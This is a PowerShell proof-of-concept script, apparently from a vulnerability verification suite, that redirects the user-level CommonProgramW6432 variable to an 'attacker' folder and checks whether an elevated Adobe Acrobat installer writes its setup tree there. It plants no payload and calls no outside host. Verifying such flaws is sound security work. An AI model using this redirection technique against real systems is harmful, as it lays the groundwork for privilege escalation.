param([string]$InstallerPath, [int]$TimeoutSeconds = 180)

. (Join-Path $PSScriptRoot 'common.ps1')

Write-Header 'ACRO-01 - Privileged install path controlled by %CommonProgramW6432%'
Require-Admin
Ensure-Results

$inst = Get-InstallerPath $InstallerPath
Assert-InstallerHash $inst | Out-Null

$root = Join-Path $WorkDir 'acro01'
if (Test-Path -LiteralPath $root) { Remove-Item -Recurse -Force -LiteralPath $root -ErrorAction SilentlyContinue }
$attacker = Join-Path $root 'Common Files\Adobe'
$targetTree = Join-Path $attacker 'Adobe\Acrobat\Setup'
New-Item -ItemType Directory -Force -Path $attacker | Out-Null

$oldUser = [Environment]::GetEnvironmentVariable('CommonProgramW6432', 'User')
$oldProc = $env:CommonProgramW6432
[Environment]::SetEnvironmentVariable('CommonProgramW6432', $attacker, 'User')
$env:CommonProgramW6432 = $attacker

$log = Join-Path $ResultsDir 'acro01-process.log'
$proc = Start-Process -FilePath $inst -PassThru
$deadline = (Get-Date).AddSeconds($TimeoutSeconds)
$found = $false
while ((Get-Date) -lt $deadline) {
    if (Test-Path -LiteralPath $targetTree) { $found = $true; break }
    if ($proc.HasExited) { break }
    Get-CimInstance Win32_Process -Filter "Name='setup.exe' OR Name='msiexec.exe'" -ErrorAction SilentlyContinue |
        ForEach-Object {
            Add-Content -LiteralPath $log -Value ('[{0}] {1} :: {2}' -f (Get-Date -Format o), $_.Name, $_.CommandLine) -ErrorAction SilentlyContinue
        }
    Start-Sleep -Milliseconds 250
}
Start-Sleep -Seconds 2
if ($proc -and -not $proc.HasExited) { Stop-Tree $proc.Id }
Get-Process setup,msiexec -ErrorAction SilentlyContinue | ForEach-Object { Stop-Tree $_.Id }

[Environment]::SetEnvironmentVariable('CommonProgramW6432', $oldUser, 'User')
$env:CommonProgramW6432 = $oldProc

$tree = ''
if (Test-Path -LiteralPath $root) {
    $tree = Get-ChildItem -Recurse -Force -LiteralPath $root -ErrorAction SilentlyContinue |
            Select-Object -First 80 FullName, Length | Format-Table -AutoSize | Out-String
}
Set-Content -LiteralPath (Join-Path $ResultsDir 'acro01-evidence.txt') -Value $tree

if ($found) {
    Emit-Result 'ACRO-01' 'CONFIRMED' ("elevated extractor created attacker path: $targetTree")
} else {
    Emit-Result 'ACRO-01' 'UNCONFIRMED' ("no tree under attacker path within ${TimeoutSeconds}s (see acro01-evidence.txt and AdobeSFX log)")
}
